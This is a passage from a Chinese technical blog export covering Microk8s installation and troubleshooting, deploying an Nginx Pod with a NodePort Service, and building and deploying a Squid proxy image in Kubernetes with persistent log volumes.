<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">k8s.gcr.io/pause:3.7</span><br><span class="line">docker.io/calico/cni:v3.25.1</span><br><span class="line">docker.io/calico/node:v3.25.1</span><br><span class="line">docker.io/calico/kube-controllers:v3.25.1</span><br><span class="line">docker.io/coredns/coredns:1.10.1</span><br><span class="line">registry.k8s.io/ingress-nginx/controller:v1.11.2</span><br><span class="line">registry.k8s.io/metrics-server/metrics-server:v0.6.3</span><br></pre></td></tr></table></figure>
<p>从国内源下载镜像，再给镜像打tag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microk8s.ctr images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/pause:3.7</span><br><span class="line">microk8s.ctr images tag  swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/pause:3.7  registry.k8s.io/pause:3.7</span><br><span class="line"></span><br><span class="line">microk8s.ctr images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/cni:v3.25.1</span><br><span class="line">microk8s.ctr images tag  swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/cni:v3.25.1  docker.io/calico/cni:v3.25.1</span><br><span class="line"></span><br><span class="line">microk8s.ctr images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/node:v3.25.1</span><br><span class="line">microk8s.ctr images tag  swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/node:v3.25.1  docker.io/calico/node:v3.25.1</span><br><span class="line"></span><br><span class="line">microk8s.ctr images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/kube-controllers:v3.25.1</span><br><span class="line">microk8s.ctr images tag  swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/calico/kube-controllers:v3.25.1  docker.io/calico/kube-controllers:v3.25.1</span><br><span class="line"></span><br><span class="line">microk8s.ctr images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/coredns/coredns:v1.10.1</span><br><span class="line">microk8s.ctr images tag  swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/coredns/coredns:v1.10.1  docker.io/coredns/coredns:1.10.1</span><br><span class="line"></span><br><span class="line">microk8s.ctr images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/ingress-nginx/controller:v1.11.2</span><br><span class="line">microk8s.ctr images tag  swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/ingress-nginx/controller:v1.11.2  registry.k8s.io/ingress-nginx/controller:v1.11.2</span><br><span class="line"></span><br><span class="line">microk8s.ctr images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/metrics-server/metrics-server:v0.6.3</span><br><span class="line">microk8s.ctr images tag  swr.cn-north-4.myhuaweicloud.com/ddn-k8s/registry.k8s.io/metrics-server/metrics-server:v0.6.3  registry.k8s.io/metrics-server/metrics-server:v0.6.3</span><br></pre></td></tr></table></figure>

<p><strong>问题2</strong>: metrics-server启动失败, ‘dial tcp XXX:10250: connect: no route to host”<br>解决方法：关闭防火墙，禁用SELinux</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl disable firewalld --now</span><br><span class="line">setenforce 0</span><br><span class="line">vim /etc/selinux/config</span><br><span class="line">SELINX=enforcing这行改成SELINUX=permissive</span><br></pre></td></tr></table></figure>

<p>开启ip_forward</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/sysctl.conf</span><br><span class="line">net.bridge.bridge-nf-call-iptables  = 1</span><br><span class="line">net.ipv4.ip_forward                 = 1</span><br><span class="line">net.bridge.bridge-nf-call-ip6tables = 1</span><br></pre></td></tr></table></figure>

<h2><span id="离线安装microk8s">离线安装Microk8s</span></h2><p>1、在可联网的环境下载Microk8s的snap安装包</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap download microk8s --channel=1.31/stable <span class="comment"># 下载指定版本1.31</span></span><br></pre></td></tr></table></figure>

<p>2、将下载好的snap包传输到目标机器上，安装microk8s</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">snap ack microk8s_&lt;版本号&gt;.assert</span><br><span class="line">snap install microk8s_&lt;版本号&gt;.snap --classic</span><br></pre></td></tr></table></figure>

<p>3、启动Microk8s服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s start</span><br></pre></td></tr></table></figure>

<p>4、在可联网的环境下载Microk8s插件的Image并导出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s.ctr i list | grep -vw DIGEST | grep -v ^sha256 | grep -v @sha256 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">k8s.gcr.io/pause:3.7</span><br><span class="line">docker.io/calico/cni:v3.25.1</span><br><span class="line">docker.io/calico/node:v3.25.1</span><br><span class="line">docker.io/calico/kube-controllers:v3.25.1</span><br><span class="line">docker.io/coredns/coredns:1.10.1</span><br><span class="line">registry.k8s.io/ingress-nginx/controller:v1.11.2</span><br><span class="line">registry.k8s.io/metrics-server/metrics-server:v0.6.3</span><br><span class="line"></span><br><span class="line">microk8s.ctr i <span class="built_in">export</span> cni.tar docker.io/calico/cni:v3.25.1</span><br><span class="line">microk8s.ctr i <span class="built_in">export</span> kube-controllers.tar docker.io/calico/kube-controllers:v3.25.1</span><br><span class="line">microk8s.ctr i <span class="built_in">export</span> .....</span><br></pre></td></tr></table></figure>

<p>5、将image传到目标机器上并导入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s.ctr image import *.tar</span><br></pre></td></tr></table></figure>

<p>6、启动microk8s插件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s <span class="built_in">enable</span> dns ingress metrics-server</span><br><span class="line">microk8s status --wait-ready</span><br></pre></td></tr></table></figure>

<p>7、配置kubectl访问Microk8s</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s.kubectl config view --raw &gt; <span class="variable">$HOME</span>/.kube/config</span><br></pre></td></tr></table></figure>

<h2><span id="卸载microk8s">卸载microk8s</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">microk8s stop </span><br><span class="line">snap remove microk8s</span><br><span class="line"><span class="built_in">rm</span> -rf /root/.kube</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>在Microk8s上创建Pod</title>
    <url>/2024/1202220520.html</url>
    <content><![CDATA[<h1><span id="环境">环境</span></h1><ul>
<li>Rocky Linux9.4 x86_64 VM </li>
<li>安装了Microk8s (参考:<a href="https://pcj600.github.io/2024/1201142626.html">Microk8s安装方法</a>)</li>
</ul>
<p>说明: 其他k8s(例如: k3s, kubernetes)创建Pod的方法和Microk8s没啥区别，可以参考本文</p>
<h1><span id="目标">目标</span></h1><p>创建一个Nginx的Pod，映射宿主机30000端口到Pod容器的80端口；客户端能通过宿主机30000端口访问Pod容器中的Nginx服务</p>
<h1><span id="步骤">步骤</span></h1><span id="more"></span>

<h2><span id="从国内源下载nginx1273镜像-再导入镜像">从国内源下载nginx:1.27.3镜像, 再导入镜像</span></h2><p>Microk8s执行如下命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microk8s.ctr images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/nginx:1.27.3</span><br><span class="line">microk8s.ctr images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/nginx:1.27.3 docker.io/library/nginx:1.27.3</span><br></pre></td></tr></table></figure>
<p>如果是Kubernetes环境，执行如下命令: (和Microk8s大同小异)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctr -n k8s.io images pull swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/nginx:1.27.3</span><br><span class="line">ctr -n k8s.io images tag swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/nginx:1.27.3 docker.io/library/nginx:1.27.3</span><br></pre></td></tr></table></figure>

<h2><span id="创建nginx的namespace">创建nginx的namespace</span></h2><p>创建一个新的namespace，名称为nginx，后续在这个namespace下创建Pod</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl create ns nginx</span><br></pre></td></tr></table></figure>

<h2><span id="创建并应用deployment">创建并应用deployment</span></h2><p>创建nginx-deployment.yaml文件，内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment #指定资源类型</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-deployment #指定deployment名称</span><br><span class="line">  namespace: nginx #指定pod运行的namespace</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nginx</span><br><span class="line">  replicas: 1 # 指定副本数(nginx pod个数)</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx</span><br><span class="line">        image: nginx:1.27.3 #(指定镜像)</span><br><span class="line">        imagePullPolicy: IfNotPresent #(指定镜像拉取策略, IfNotPresent表示如果本地有就取本地镜像，否则从网络拉取镜像</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 80 # 容器内暴露的端口</span><br></pre></td></tr></table></figure>
<p>这个yaml文件参考了官方文档： <a href="https://kubernetes.io/zh-cn/docs/tasks/run-application/run-stateless-application-deployment/">https://kubernetes.io/zh-cn/docs/tasks/run-application/run-stateless-application-deployment/</a><br>再应用这个deployment</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f nginx-deployment.yaml</span><br><span class="line">deployment.apps/nginx-deployment created</span><br></pre></td></tr></table></figure>
<p>deployment创建成功后，查看Nginx pod状态如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n nginx get pods</span><br><span class="line">NAME                                READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx-deployment-5c7dff4cf7-gbtsr   1/1     Running   0          2m55s</span><br></pre></td></tr></table></figure>
<p>查看当前Nginx deployment的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n nginx get deploy nginx-deployment -o yaml</span><br></pre></td></tr></table></figure>

<h2><span id="创建并应用service-将宿主机端口例如30000端口映射到pod的80端口">创建并应用service, 将宿主机端口(例如30000端口)映射到Pod的80端口</span></h2><p>创建nginx-service.yaml文件，主要字段的说明参考注释，文件内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service #指定资源类型</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-service #指定service的名称</span><br><span class="line">  namespace: nginx #指定pod运行的namespace</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    app: nginx</span><br><span class="line">  type: NodePort</span><br><span class="line">  ports:</span><br><span class="line">    - protocol: TCP</span><br><span class="line">      targetPort: 80 # Pod容器中的端口，是Nginx程序实际监听的端口</span><br><span class="line">      port: 80 # 暴露在cluster IP上的端口，提供集群内部访问service的入口, 即clusterIP:port</span><br><span class="line">      nodePort: 30000 # 指定宿主机的端口, nodePort提供集群外部访问Service的能力</span><br></pre></td></tr></table></figure>
<p>面试题: 说说看Service中port, targetPort, nodePort的作用，有什么区别?</p>
<ul>
<li>port: 暴露在cluster IP上的端口，提供集群内部访问service的入口，即clusterIP:port</li>
<li>nodePort: 宿主机端口, 提供集群外部访问Service的能力</li>
<li>targetPort: Pod内部端口，是实际应用程序监听的端口</li>
</ul>
<p>再应用这个service</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f nginx-service.yaml</span><br><span class="line">service/nginx-service created</span><br></pre></td></tr></table></figure>
<p>执行成功后，查看service</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n nginx get svc</span><br><span class="line">NAME            TYPE       CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE</span><br><span class="line">nginx-service   NodePort   10.152.183.248   &lt;none&gt;        80:30000/TCP   2m32s</span><br></pre></td></tr></table></figure>
<p>可以看出NodePort端口是30000，clusterIp:port为10.152.183.248:80</p>
<h2><span id="测试">测试</span></h2><p>通过NodePort方式可以访问Nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl localhost:30000</span><br><span class="line">...</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>通过clusterIp:port方式也可以访问Nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 10.152.183.248:80</span><br><span class="line">...</span><br><span class="line">&lt;title&gt;Welcome to nginx!&lt;/title&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h1><span id="删除nginx-pod">删除Nginx Pod</span></h1><p>删除之前创建的deployment和service资源即可，方法如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n nginx delete deploy nginx-deployment</span><br><span class="line">kubectl -n nginx delete svc nginx-service</span><br></pre></td></tr></table></figure>

<h2><span id="参考">参考</span></h2><p><a href="https://kubernetes.io/zh-cn/docs/tasks/run-application/run-stateless-application-deployment/">https://kubernetes.io/zh-cn/docs/tasks/run-application/run-stateless-application-deployment/</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>【k8s实践】 部署Squid</title>
    <url>/2024/1208145435.html</url>
    <content><![CDATA[<h1><span id="前言">前言</span></h1><p>学习如何在k8s中部署Squid, 过程如下:</p>
<ul>
<li>先在Docker环境中运行Squid, 准备好Squid镜像。</li>
<li>再搭建一个k8s环境，把上一步的docker镜像传进来，再创建对应k8s资源，完成Squid的部署</li>
</ul>
<h1><span id="准备环境">准备环境</span></h1><p>准备两台Linux VM:</p>
<ul>
<li>一台Centos&#x2F;RHEL&#x2F;RockyLinux 7&#x2F;8&#x2F;9，安装Docker, 构建Squid的Docker镜像</li>
<li>一台RockyLinux 9, 用于运行k8s, 部署Squid</li>
</ul>
<h1><span id="1-在docker环境中运行squid-准备squid镜像">1. 在Docker环境中运行Squid, 准备Squid镜像</span></h1><h2><span id="安装docker">安装Docker</span></h2><p>参考: <a href="https://blog.csdn.net/pcj_888/article/details/143018460">安装Docker</a></p>
<span id="more"></span>

<h2><span id="准备squid主配置文件squidconf">准备Squid主配置文件squid.conf</span></h2><p>我是基于rocky9.3的镜像, 通过yum install方式安装Squid, 默认主配置文件路径在容器中的<code>/etc/squid/squid.conf</code><br>使用默认的squid.conf, 无法在容器中正常启动Squid。 需要额外添加如下配置，从而以squid普通用户启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cache_effective_user squid</span><br><span class="line">cache_effective_group squid</span><br><span class="line">cache_log /var/log/squid/cache.log</span><br><span class="line">access_log /var/log/squid/access.log squid</span><br></pre></td></tr></table></figure>
<p>你可以在rocky9.3的容器里装一个squid，把<code>/etc/squid/squid.conf</code>拷出来，再添加以上配置即可; 或者直接使用如下的squid.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"># Recommended minimum configuration:</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># Example rule allowing access from your local networks.</span><br><span class="line"># Adapt to list your (internal) IP networks from where browsing</span><br><span class="line"># should be allowed</span><br><span class="line">acl localnet src 0.0.0.1-0.255.255.255  # RFC 1122 &quot;this&quot; network (LAN)</span><br><span class="line">acl localnet src 10.0.0.0/8     # RFC 1918 local private network (LAN)</span><br><span class="line">acl localnet src 100.64.0.0/10      # RFC 6598 shared address space (CGN)</span><br><span class="line">acl localnet src 169.254.0.0/16     # RFC 3927 link-local (directly plugged) machines</span><br><span class="line">acl localnet src 172.16.0.0/12      # RFC 1918 local private network (LAN)</span><br><span class="line">acl localnet src 192.168.0.0/16     # RFC 1918 local private network (LAN)</span><br><span class="line">acl localnet src fc00::/7           # RFC 4193 local private network range</span><br><span class="line">acl localnet src fe80::/10          # RFC 4291 link-local (directly plugged) machines</span><br><span class="line"></span><br><span class="line">acl SSL_ports port 443</span><br><span class="line">acl Safe_ports port 80      # http</span><br><span class="line">acl Safe_ports port 21      # ftp</span><br><span class="line">acl Safe_ports port 443     # https</span><br><span class="line">acl Safe_ports port 70      # gopher</span><br><span class="line">acl Safe_ports port 210     # wais</span><br><span class="line">acl Safe_ports port 1025-65535  # unregistered ports</span><br><span class="line">acl Safe_ports port 280     # http-mgmt</span><br><span class="line">acl Safe_ports port 488     # gss-http</span><br><span class="line">acl Safe_ports port 591     # filemaker</span><br><span class="line">acl Safe_ports port 777     # multiling http</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Recommended minimum Access Permission configuration:</span><br><span class="line">#</span><br><span class="line"># Deny requests to certain unsafe ports</span><br><span class="line">http_access deny !Safe_ports</span><br><span class="line"></span><br><span class="line"># Deny CONNECT to other than secure SSL ports</span><br><span class="line">http_access deny CONNECT !SSL_ports</span><br><span class="line"></span><br><span class="line"># Only allow cachemgr access from localhost</span><br><span class="line">http_access allow localhost manager</span><br><span class="line">http_access deny manager</span><br><span class="line"></span><br><span class="line"># We strongly recommend the following be uncommented to protect innocent</span><br><span class="line"># web applications running on the proxy server who think the only</span><br><span class="line"># one who can access services on &quot;localhost&quot; is a local user</span><br><span class="line">#http_access deny to_localhost</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line"># Example rule allowing access from your local networks.</span><br><span class="line"># Adapt localnet in the ACL section to list your (internal) IP networks</span><br><span class="line"># from where browsing should be allowed</span><br><span class="line">http_access allow localnet</span><br><span class="line">http_access allow localhost</span><br><span class="line"></span><br><span class="line"># And finally deny all other access to this proxy</span><br><span class="line">http_access deny all</span><br><span class="line"></span><br><span class="line"># Squid normally listens to port 3128</span><br><span class="line">http_port 3128</span><br><span class="line"></span><br><span class="line"># Uncomment and adjust the following to add a disk cache directory.</span><br><span class="line">#cache_dir ufs /var/spool/squid 100 16 256</span><br><span class="line"></span><br><span class="line"># Leave coredumps in the first cache dir</span><br><span class="line">coredump_dir /var/spool/squid</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line"># Add any of your own refresh_pattern entries above these.</span><br><span class="line">#</span><br><span class="line">refresh_pattern ^ftp:       1440    20% 10080</span><br><span class="line">refresh_pattern -i (/cgi-bin/|\?) 0 0%  0</span><br><span class="line">refresh_pattern .       0   20% 4320</span><br><span class="line"></span><br><span class="line">cache_effective_user squid</span><br><span class="line">cache_effective_group squid</span><br><span class="line">cache_log /var/log/squid/cache.log</span><br><span class="line">access_log /var/log/squid/access.log squid</span><br></pre></td></tr></table></figure>
<h2><span id="编写启动脚本start_squidsh">编写启动脚本start_squid.sh</span></h2><p>编写一个启动脚本，作为容器的CMD。目的是在启动Squid前做一些必要的配置工作</p>
<ul>
<li>添加Squid用户</li>
<li>创建Squid日志目录并正确设置属主属组，防止Squid启动报错</li>
</ul>
<p>脚本内容如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">useradd -M -s /sbin/nologin squid</span><br><span class="line"><span class="built_in">mkdir</span> -p /var/log/squid</span><br><span class="line"><span class="built_in">chown</span> -R squid:squid /var/log/squid</span><br><span class="line">squid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 防止容器推出</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span> ; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">sleep</span> 60</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h2><span id="编写dockerfile">编写Dockerfile</span></h2><p>编写Dockerfile, 以rocky9.3做基础镜像，通过yum安装Squid, 用准备好的squid.conf覆盖掉默认的，再启动squid。<br>至此，你的项目目录中应该有如下三个文件:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">build.sh</span><br><span class="line">Dockerfile</span><br><span class="line">squid.conf</span><br></pre></td></tr></table></figure>
<p>Dockerfile内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM rockylinux:9.3</span><br><span class="line"></span><br><span class="line">WORKDIR /</span><br><span class="line">RUN yum -y install procps net-tools squid</span><br><span class="line">COPY squid.conf /etc/squid/squid.conf</span><br><span class="line">COPY start_squid.sh /start_squid.sh</span><br><span class="line">RUN chmod +x start_squid.sh</span><br><span class="line"></span><br><span class="line">CMD [&quot;sh&quot;, &quot;-c&quot;, &quot;/start_squid.sh&quot;]</span><br></pre></td></tr></table></figure>

<h2><span id="构建并保存镜像到文件">构建并保存镜像到文件</span></h2><p><strong>构建镜像</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile -t squid:1.0 .</span><br></pre></td></tr></table></figure>
<p><strong>保存镜像到文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker save -o squid_1.0.tar squid:1.0</span><br></pre></td></tr></table></figure>
<p><code>squid_1.0.tar</code>这个镜像文件需要传到k8s机器上, 用于后续的镜像导入</p>
<h2><span id="启动容器测试镜像">启动容器，测试镜像</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cid=$(docker run -d --privileged=true --net=host --ulimit nofile=65535:65535 squid:1.0)</span><br><span class="line">docker exec -it $&#123;cid&#125; /bin/bash</span><br><span class="line"></span><br><span class="line"># 容器内curl测试结果为200 OK, 说明Squid代理正常工作</span><br><span class="line">curl -sIL -w &quot;%&#123;http_code&#125;\n&quot; -x localhost:3128 https://www.baidu.com</span><br><span class="line">HTTP/1.1 200 Connection established</span><br><span class="line">...</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>

<p>可能会遇到这个报错: Squid启动失败 <code>FATAL: xcalloc: Unable to allocate 1073741816 blocks of 432 bytes!</code><br>解决方法：<br>容器内执行<code>ulimit -n</code>的值为1073741816，这个值太大了，导致Squid申请了过大的内存。 这里需要给docker run添加参数<code>--ulimit nofile=65535:65535</code></p>
<h1><span id="2-在k8s中部署squid">2. 在k8s中部署Squid</span></h1><p>在单机k8s中部署Squid。Pod副本数设置为1, 使用宿主机网络, 监听3128端口。</p>
<h2><span id="在rockylinux9-vm上搭建单机k8s">在RockyLinux9 VM上搭建单机k8s</span></h2><p>k8s单机环境用kubernetes, Microk8s, k3s都可以, 我用的是kubernetes; k8s搭建方式参考:</p>
<ul>
<li><a href="https://blog.csdn.net/pcj_888/article/details/144240636">kubernetes搭建</a></li>
<li><a href="https://blog.csdn.net/pcj_888/article/details/144169716">Microk8s单机搭建</a></li>
</ul>
<h2><span id="把squid镜像传到k8s机器上导入镜像">把Squid镜像传到k8s机器上，导入镜像</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctr -n k8s.io image import squid_1.0.tar</span><br><span class="line">unpacking docker.io/library/squid:1.0 (sha256:3f027335651ca3d8979672e22b5202cc85dfcc22f81fe1814fa0a8dd34078cae)...done</span><br></pre></td></tr></table></figure>
<p>如果是Microk8s环境，用如下命令导入镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microk8s.ctr image import squid_1.0.tar</span><br></pre></td></tr></table></figure>

<h2><span id="创建deployment-设置pod内存限制-应用deployment">创建Deployment, 设置Pod内存限制, 应用Deployment</span></h2><p>首先创建一个namespace，名称为squid, 和其他namespace资源隔离开。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl create ns squid</span><br></pre></td></tr></table></figure>
<p>创建<code>squid-deployment.yaml</code>文件, 限制Pod内存为4GiB，内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: squid</span><br><span class="line">  namespace: squid # 指定namespace</span><br><span class="line">  labels:</span><br><span class="line">    name: squid</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1 # 副本数为1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: squid</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: squid</span><br><span class="line">    spec:</span><br><span class="line">      dnsPolicy: ClusterFirstWithHostNet</span><br><span class="line">      hostNetwork: true # 使用宿主机网络</span><br><span class="line">      containers:</span><br><span class="line">        - name: squid</span><br><span class="line">          image: squid:1.0 # 指定镜像名称</span><br><span class="line">          imagePullPolicy: IfNotPresent # 镜像下载策略, 如果本地不存在尝试下载</span><br><span class="line">          resources:</span><br><span class="line">            limits:</span><br><span class="line">              memory: &quot;4Gi&quot; # 内存限制4G</span><br></pre></td></tr></table></figure>
<p>再应用Deployment</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl create -f squid-deployment.yaml</span><br></pre></td></tr></table></figure>

<p>此时能观察到Pod被创建, 但是会因为内存溢出不断的重启。 这个问题的解决思路有两种:</p>
<ul>
<li>设置Pod的ulimits限制，限制打开的文件数。</li>
<li>在Squid配置文件中限制最大的fd个数(max_filedescriptors)</li>
</ul>
<p>这里采用第二种方法, 直接修改squid.conf的方法, 在配置文件最后添加一行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">max_filedescriptors 65536</span><br></pre></td></tr></table></figure>
<p>再重新打镜像, 导入k8s, 创建Deployment, 问题解决。 Squid Pod创建成功，正向代理功能测试OK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x localhost:3128 https://www.baidu.com</span><br><span class="line">200 OK</span><br></pre></td></tr></table></figure>

<p>注: 实际应用中, 可以用squidclient测试, 为<code>max_filedescriptors</code>设置合适的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">squidclient mgr:info | grep &#x27;file desc&#x27;</span><br><span class="line">        Maximum number of file descriptors:   65536</span><br><span class="line">        Largest file desc currently in use:     11</span><br><span class="line">        Number of file desc currently in use:    6</span><br><span class="line">        Available number of file descriptors: 65530</span><br><span class="line">        Reserved number of file descriptors:   100</span><br></pre></td></tr></table></figure>

<h2><span id="创建volume-把squid日志持久化保存">创建Volume, 把Squid日志持久化保存</span></h2><p>实际应用中，需要把Squid的访问日志持久化保存，用于问题定位。 如果Pod遇到故障重启, 之前记录的日志也要保留下来。 在K8s中可以通过Volume实现这一点。</p>
<p>实现效果: 把Squid Pod中<code>/var/log/squid/</code>下的所有日志文件，持久化保存到宿主机中的&#x2F;data&#x2F;squidlog&#x2F;</p>
<p><strong>创建<code>squid-volume.yaml</code>文件, 定义PV和PVC</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: PersistentVolume</span><br><span class="line">metadata:</span><br><span class="line">  name: squid-volume</span><br><span class="line">  namespace: squid</span><br><span class="line">spec:</span><br><span class="line">  capacity:</span><br><span class="line">    storage: 4Gi</span><br><span class="line">  accessModes:</span><br><span class="line">    - ReadWriteOnce</span><br><span class="line">  hostPath:</span><br><span class="line">    path: /data/squidlog/ # 指定宿主机路径</span><br><span class="line">  claimRef:</span><br><span class="line">    name: squid-claim</span><br><span class="line">    namespace: squid</span><br><span class="line">---</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: PersistentVolumeClaim</span><br><span class="line">metadata:</span><br><span class="line">  name: squid-claim</span><br><span class="line">  namespace: squid</span><br><span class="line">spec:</span><br><span class="line">  volumeName: squid-volume</span><br><span class="line">  accessModes:</span><br><span class="line">    - ReadWriteOnce</span><br><span class="line">  resources:</span><br><span class="line">    requests:</span><br><span class="line">      storage: 4Gi</span><br></pre></td></tr></table></figure>

<p><strong>修改<code>squid-deployment.yaml</code>文件, 引用volume</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: squid</span><br><span class="line">  namespace: squid</span><br><span class="line">  labels:</span><br><span class="line">    name: squid</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: squid</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: squid</span><br><span class="line">    spec:</span><br><span class="line">      volumes:</span><br><span class="line">        - name: squid-volume</span><br><span class="line">          persistentVolumeClaim:</span><br><span class="line">            claimName: squid-claim</span><br><span class="line">      dnsPolicy: ClusterFirstWithHostNet</span><br><span class="line">      hostNetwork: true</span><br><span class="line">      containers:</span><br><span class="line">        - name: squid</span><br><span class="line">          image: squid:IMAGE_PLACEHOLDER</span><br><span class="line">          imagePullPolicy: IfNotPresent</span><br><span class="line">          resources:</span><br><span class="line">            limits:</span><br><span class="line">              memory: &quot;4Gi&quot;</span><br><span class="line">          volumeMounts:</span><br><span class="line">            - mountPath: /var/log/squid # 指定Pod中Squid日志路径</span><br><span class="line">              name: squid-volume</span><br></pre></td></tr></table></figure>

<p>在宿主机创建目录<code>mkdir -p /data/squidlog/</code>, 应用Volume, Deployment</p>
